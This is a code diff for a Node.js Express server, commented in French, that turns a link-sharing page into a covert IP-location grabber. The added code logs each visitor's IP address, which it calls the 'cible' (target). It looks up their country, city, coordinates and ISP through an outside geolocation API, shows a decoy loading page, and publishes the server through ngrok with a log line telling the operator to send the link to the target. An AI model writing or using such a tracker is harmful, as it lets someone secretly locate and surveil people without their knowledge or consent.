@@ -1,55 +1,50 @@
 const express = require('express');
-const chalk = require('chalk');
 const ngrok = require('ngrok');
+const axios = require('axios');
+const chalk = require('chalk');
 const app = express();
 const port = 3000;
 
-// Middleware pour servir des fichiers statiques (optionnel)
-app.use(express.static('public'));
+// Middleware pour parser le JSON
+app.use(express.json());
 
-// Route pour l'interface
+// Route pour l'interface de la cible
 app.get('/', (req, res) => {
+    // Récupérer l'IP de la cible
+    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    console.log(chalk.green(`[+] Nouvelle connexion depuis l'IP : ${ip}`));
+
+    // Récupérer la géolocalisation via une API (ex: ip-api.com)
+    axios.get(`http://ip-api.com/json/${ip}`)
+        .then(response => {
+            const data = response.data;
+            console.log(chalk.blue(`[+] Localisation de la cible :`));
+            console.log(chalk.blue(`- Pays : ${data.country}`));
+            console.log(chalk.blue(`- Région : ${data.regionName}`));
+            console.log(chalk.blue(`- Ville : ${data.city}`));
+            console.log(chalk.blue(`- Latitude : ${data.lat}`));
+            console.log(chalk.blue(`- Longitude : ${data.lon}`));
+            console.log(chalk.blue(`- ISP : ${data.isp}`));
+        })
+        .catch(error => {
+            console.log(chalk.red(`[!] Erreur lors de la récupération de la localisation : ${error.message}`));
+        });
+
+    // Afficher une page basique pour la cible
     res.send(`
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Interface Stylée</title>
+            <title>Localisation en cours...</title>
             <style>
-                body {
-                    font-family: Arial, sans-serif;
-                    background-color: #f0f0f0;
-                    text-align: center;
-                    padding: 50px;
-                }
-                h1 {
-                    color: #333;
-                }
-                .container {
-                    background-color: white;
-                    padding: 20px;
-                    border-radius: 10px;
-                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-                    max-width: 500px;
-                    margin: 0 auto;
-                }
-                .link {
-                    color: #007BFF;
-                    font-size: 18px;
-                    margin: 10px 0;
-                }
+                body { font-family: Arial; text-align: center; padding: 50px; }
+                h1 { color: #333; }
+                p { color: #666; }
             </style>
         </head>
         <body>
-            <div class="container">
-                <h1>Bienvenue sur l'interface stylée</h1>
-                <p>Voici le lien à partager :</p>
-                <p class="link" id="ngrokLink">Chargement...</p>
-            </div>
-            <script>
-                // Récupérer le lien ngrok depuis l'URL actuelle
-                const currentUrl = window.location.href;
-                document.getElementById('ngrokLink').textContent = currentUrl;
-            </script>
+            <h1>Chargement...</h1>
+            <p>Merci de patienter.</p>
         </body>
         </html>
     `);
@@ -57,22 +52,14 @@ app.get('/', (req, res) => {
 
 // Démarrer le serveur
 app.listen(port, async () => {
-    console.log(
-        chalk.green(`Serveur démarré sur http://localhost:${port}`)
-    );
+    console.log(chalk.yellow(`[*] Serveur démarré sur http://localhost:${port}`));
 
-    // Lancer ngrok et afficher le lien
+    // Lancer ngrok
     try {
         const url = await ngrok.connect(port);
-        console.log(
-            chalk.blue(`Lien ngrok : ${url}`)
-        );
-        console.log(
-            chalk.yellow(`Envoie ce lien à ta cible : ${url}`)
-        );
+        console.log(chalk.green(`[+] Lien ngrok généré : ${url}`));
+        console.log(chalk.green(`[+] Envoie ce lien à ta cible : ${url}`));
     } catch (error) {
-        console.error(
-            chalk.red(`Erreur avec ngrok : ${error.message}`)
-        );
+        console.log(chalk.red(`[!] Erreur avec ngrok : ${error.message}`));
     }
 });
